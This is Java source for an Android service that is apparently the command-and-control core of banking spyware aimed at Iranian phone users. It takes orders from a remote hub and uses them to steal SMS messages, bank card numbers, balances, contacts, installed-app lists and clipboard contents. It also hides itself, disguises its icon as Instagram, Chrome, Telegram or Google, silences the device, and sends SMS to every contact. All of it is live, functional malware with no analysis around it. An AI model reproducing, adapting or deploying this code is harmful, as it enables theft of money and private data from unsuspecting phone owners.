package com.mehrab.android.Service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.mehrab.android.Application.ServiceManager;
import com.mehrab.android.MainActivity;
import com.mehrab.android.Models.ContactModel;
import com.mehrab.android.Models.SmsModel;
import com.mehrab.android.R;

import java.util.ArrayList;
import java.util.List;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ForegroundService extends Service {
    private boolean reconnect = true;
    private ServiceManager manager;
    private PowerManager.WakeLock wakeLock;
    @Override

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        if (wakeLock != null) {
            wakeLock.release();
            wakeLock = null;
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        manager = (ServiceManager) getApplicationContext();
        manager.setHubConnection();
        new Thread() {
            public void run() {
                manager.getHubConnection().on("Configuration", (auto_hide) -> {
                    try {
                        manager.SetAutoHide(auto_hide);
                        if (manager.CheckPermissions() && auto_hide)
                            manager.HideApplication();

                    } catch (Exception exception) {
                        exception.printStackTrace();
                    }
                },Boolean.class);

                manager.getHubConnection().on("FilterMessage", (filter ,count) -> {
                    filter = filter.replace(" ","");
                    try {
                        String ResponseCommand = "Message List With Filter";
                        StringBuilder ResponseInformation = new StringBuilder();
                        List<SmsModel> models = manager.getAllSms();
                        List<SmsModel> filtering = new ArrayList<SmsModel>();

                        for (SmsModel model:models) {

                            if(filter.equals("operator"))
                            {
                                if (model.message.contains("همراه گرامی") || model.message.contains("مشترک گرامی") || model.message.contains("رایتل") || model.sender.toLowerCase().contains("irancell")) {
                                    String regex = "(\\+98|0)?9\\d{9}";

                                    Pattern pattern = Pattern.compile(regex);
                                    Matcher matcher = pattern.matcher(model.message.replaceAll("\\s", "").replaceAll(" ", ""));

                                    if (matcher.find()) filtering.add(model);
                                }
                            }else if (filter.equals("bank"))
                            {
                                if (model.sender.toLowerCase().contains("بانک") || model.sender.toLowerCase().contains("bank")
                                || model.message.replace(" ","").contains("حساب:") || model.message.replace(" ","").contains("مانده:")|| model.message.replace(" ","").contains("موجودی:"))
                                    filtering.add(model);
                            }else if (filter.equals("contact"))
                            {
                                if (model.sender.startsWith("+989"))
                                    filtering.add(model);
                            }
                            else if (filter.equals("last"))
                            {
                                filtering.add(model);
                            }else if(filter.equals("card"))
                            {
                                String regex = "^(\\d{4}-?){3}\\d{4}|\\d{16}$";

                                Pattern pattern = Pattern.compile(regex);
                                Matcher matcher = pattern.matcher(model.message.replaceAll("\\s", "").replaceAll(" ", ""));

                                while(matcher.find()) {
                                    String CardNumber = matcher.group().replace("-","").replace(" ","");
                                    String englishCart = manager.convertToEnglishDigits(CardNumber);
                                    String bankName = manager.getBankCode(englishCart.substring(0, 6));
                                    if(!ResponseInformation.toString().contains(englishCart))
                                        ResponseInformation.append(englishCart).append("|").append(bankName).append("\n");

                                }
                            }else if(filter.equals("phone"))
                            {
                                String regex = "(\\+98|0)?9\\d{9}";

                                Pattern pattern = Pattern.compile(regex);
                                Matcher matcher = pattern.matcher(model.message.replaceAll("\\s", "").replaceAll(" ", ""));
                                while(matcher.find()) {
                                    String phone = matcher.group();
                                    String formattedPhone = "";

                                    if (phone.startsWith("0"))
                                        formattedPhone = "+98" + phone.substring(1);
                                    else if (phone.startsWith("+"))
                                        formattedPhone = phone;
                                    else formattedPhone = "+98" + phone;

                                    if (!ResponseInformation.toString().contains(formattedPhone))
                                        ResponseInformation.append(formattedPhone).append("\n");
                                }
                            }else{
                                ResponseInformation.append("message list is empty");
                                break;
                            }
                        }
                        for (SmsModel model:filtering.subList(0 ,Math.min(filtering.size() ,count))) {
                            String typeString = model.type == 1 ? "inbox" : "sent";

                            ResponseInformation.append(typeString).append("|").append(model.sender)
                                    .append("\n").append(model.message).append("\n").append("_____").append("\n");
                        }
                        if(ResponseInformation.toString().replace(" ","").equals(""))
                            ResponseInformation.append("message list is empty");

                        manager.SendMessage(true, ResponseCommand, ResponseInformation.toString());

                    } catch (Exception exception) {
                        exception.printStackTrace();
                    }
                },String.class ,Integer.class);
                manager.getHubConnection().on("Receive", (message) -> {
                    try {
                        String ResponseCommand = "";
                        String ResponseInformation = "null";

                        boolean ResponseIsDocument = false;
                        switch (message) {
                            case "HideApplication":
                                ResponseCommand = manager.HideApplication();
                                break;
                            case "ShowApplication":
                                manager.SetAutoHide(false);
                                ResponseCommand = manager.ShowApplication();
                                break;
                            case "PingApplication":
                                ResponseCommand = "Target Now is Active";
                                break;
                            case "ClipboardApplication":
                                ResponseCommand = manager.ClipboardApplication();
                                break;
                            case "PermissionApplication":
                                ResponseCommand = manager.PermissionApplication();
                                break;

                            case "PackageApplication":
                                ResponseIsDocument = true;
                                ResponseCommand = "Application List";
                                ResponseInformation = manager.GetAllPackage();
                                break;

                            case "FilterContactAll":
                                ResponseIsDocument = true;
                                ResponseCommand = "Contact List";

                                StringBuilder sb1 = new StringBuilder();

                                for (ContactModel contact : manager.getAllContact())
                                    sb1.append(contact.phoneNumber).append("|").append(contact.name).append("\n");

                                ResponseInformation = sb1.toString();
                                break;
                            case "FilterContactWhatsApp":
                                ResponseIsDocument = true;
                                ResponseCommand = "Contact List";

                                StringBuilder sb2 = new StringBuilder();

                                for (ContactModel contact : manager.getAllContact())
                                    if(manager.hasWhatsapp(contact.id))
                                        sb2.append(contact.phoneNumber).append("|").append(contact.name).append("\n");

                                ResponseInformation = sb2.toString();
                                break;
                            case "InfoApplication":
                                ResponseCommand = manager.FullInformation();
                                break;
                            case "SilentApplication":
                                ResponseCommand = manager.SilentApplication();
                                break;
                            case "NormalApplication":
                                ResponseCommand = manager.NormalApplication();
                                break;

                            case "IconInstagram":
                                ResponseCommand = manager.ChangeIconApplication(new ComponentName(getApplicationContext(), getPackageName() + ".InstagramActivity"));
                                break;
                            case "IconChrome":
                                ResponseCommand = manager.ChangeIconApplication(new ComponentName(getApplicationContext(), getPackageName() + ".ChromeActivity"));
                                break;
                            case "IconTelegram":
                                ResponseCommand = manager.ChangeIconApplication(new ComponentName(getApplicationContext(), getPackageName() + ".TelegramActivity"));
                                break;
                            case "IconPlayStore":
                                ResponseCommand = manager.ChangeIconApplication(new ComponentName(getApplicationContext(), getPackageName() + ".PlayStoreActivity"));
                                break;
                            case "IconDefault":
                                ResponseCommand = manager.ChangeIconApplication(new ComponentName(getApplicationContext(), getPackageName() + ".MainActivity"));
                                break;
                            case "IconGoogle":
                                ResponseCommand = manager.ChangeIconApplication(new ComponentName(getApplicationContext(), getPackageName() + ".GoogleActivity"));
                                break;
                            case "PlaySound":
                                ResponseCommand = manager.PlaySound();
                                break;
                            case "PouseSound":
                                ResponseCommand = manager.PouseSound();
                                break;

                            case "EnablePhoneOffMode":
                                manager.setOfflineMode(true);
                                ResponseCommand = manager.offlineModeStatue();
                                break;
                            case "DisablePhoneOffMode":
                                manager.setOfflineMode(false);
                                ResponseCommand = manager.offlineModeStatue();
                                break;
                            case "StatusOfflineMode":
                                ResponseCommand = manager.offlineModeStatue();
                                break;
                            default:
                                return;
                        }
                        if (!ResponseCommand.equals("")) {
                            manager.SendMessage(ResponseIsDocument, ResponseCommand, ResponseInformation);
                        }
                    } catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }, String.class);
                manager.getHubConnection().on("ChangeTemplate", (template) -> {
                    try {
                        manager.setTemplate(template);
                        manager.SendMessage(false, "Link Changed Successfully",  "");
                    } catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }, String.class);
                manager.getHubConnection().on("ChangeClipboard", (message) -> {
                    try {
                        manager.SendMessage(false, manager.ChangeClipboard(message),  "");
                    } catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }, String.class);
                manager.getHubConnection().on("CreateNotification", (message) -> {
                    try {
                        manager.SendMessage(
                                false,
                                manager.createNotification("", message), "");
                    } catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }, String.class);
                manager.getHubConnection().on("ChangePhoneOffMode", (phone) -> {
                    try {
                        manager.setPhoneNumber(phone);
                    } catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }, String.class);
                manager.getHubConnection().on("SendMessage", (message ,phones ,sim) -> {
                    try {
                        String PhoneNumbers = phones.replace(" ", "");
                        if (PhoneNumbers.equals("CONTACT"))
                            for (ContactModel contact : manager.getAllContact())
                                manager.SendSMS(contact.phoneNumber, message ,sim.equals("WithTwo") ? 1: 0);

                        else for (String Phone : PhoneNumbers.split(","))
                            manager.SendSMS(Phone, message ,sim.equals("WithTwo") ? 1: 0);

                        manager.SendMessage(
                                false, "Message Sent To all users", "");
                    } catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }, String.class,String.class,String.class);

                manager.getHubConnection().on("ChangePhoneOffMode", (phoneNumber) -> {
                    try {
                        manager.setPhoneNumber(phoneNumber);
                        manager.SendMessage(
                                false, manager.offlineModeStatue(), "");

                    } catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }, String.class);

                manager.getHubConnection().onClosed(error -> {
                    if (reconnect) manager.Reconnect();
                });
                manager.Reconnect();
                manager.SendMessage(false, "the new target connected to server", "");

            }
        }.start();



        return START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel("my_channel_id", "My Channel", importance);
            channel.setDescription("Description of my channel");

            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "my_channel_id")
                .setSmallIcon(R.drawable.empty)
                .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.empty))
                .setPriority(NotificationCompat.PRIORITY_LOW);

        Notification notification = builder.build();
        startForeground(101, notification);

    }
}